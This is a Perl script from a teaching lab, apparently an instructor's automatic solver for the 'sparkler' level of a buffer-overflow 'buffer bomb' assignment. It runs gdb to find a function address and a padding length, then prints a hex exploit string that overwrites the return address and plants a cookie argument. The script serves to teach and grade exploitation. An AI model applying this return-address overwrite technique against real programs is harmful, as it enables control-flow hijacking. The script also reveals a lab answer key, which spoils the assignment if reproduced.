#!/usr/bin/perl
#!/usr/local/bin/perl

use Getopt::Std;
use lib "../grade";
use config;

# Generate exploit string for sparkler
# Assume cookie given as argument
# Location of function fizz extracted from disassembly

#######################################################################
# fizz.pl - automatically solves a buffer bomb for sparkler level
#
# Copyright (c) 2002, R. Bryant and D. O'Hallaron, All rights reserved.
# May not be used, modified, or copied without permission.
#
#######################################################################

$| = 1; # autoflush output on every print statement

#
# usage - print help message and terminate
#
sub usage 
{
    printf STDERR "$_[0]\n";
    printf STDERR "Usage: $0 [-h] -t <teamname>\n";
    printf STDERR "Options:\n";
    printf STDERR "  -t <teamname> Team name\n";
    printf STDERR "  -s            Submit solution to grading server\n";
    printf STDERR "  -h            Print this message\n";
    die "\n";
}

$flags = "";

# Get specified team and executable
getopts('hst:');
if ($opt_h) {
    usage();
}

if (!$opt_t) {
    usage("Missing team name (-t)\n");
}

if ($opt_s) {
    $flags = "-s";
}

$team = $opt_t;

# Make sure the makecookie binary is there 
system("cd $BINDIR; make > /dev/null 2>&1"); 

# Solve buffer bomb for specified team
$cookie = `$BINDIR/makecookie $team`;
chomp($cookie);

# Run GDB to extract runtime information
$gdbfile = "boom-$team.gdb";
open(GDB, ">$gdbfile") || die "Can't open GDB file $gdbfile\n";

# The gdb script runs the program far enough into getbuf that register
# %eax holds the value of buf.
# It then extracts:
#   $fizz: The address of the fizz function
#   $padcount: The amount of padding to insert to make the buffer overflow
#   and overwrite the return pointer

print GDB <<GDBSTUFF;
break getbuf
run -t $team
stepi 4
print /x (int) fizz
print /d (\$ebp-\$eax+4)
quit
GDBSTUFF

close GDB;
$gdbout = `gdb -nw $EXECUTABLE -x $gdbfile | grep \"=\"`
    || die "Couldn't run gdb with batch file $gdbfile\n";

$gdbout =~ s/\$[0-9]* = //g;
($fizz, $padcount) = split(/\n/, $gdbout);

for ($i = 0; $i < $padcount; $i++) {
    print "00 ";
}

$a = hex($fizz);
$c = hex($cookie);
printf("%.2x %.2x %.2x %.2x", $a&0xFF, ($a>>8)&0xFF, ($a>>16)&0xFF, ($a>>24) & 0xFF);
print " 00 00 00 00 ";
printf("%.2x %.2x %.2x %.2x\n", $c&0xFF, ($c>>8)&0xFF, ($c>>16)&0xFF, ($c>>24) & 0xFF);

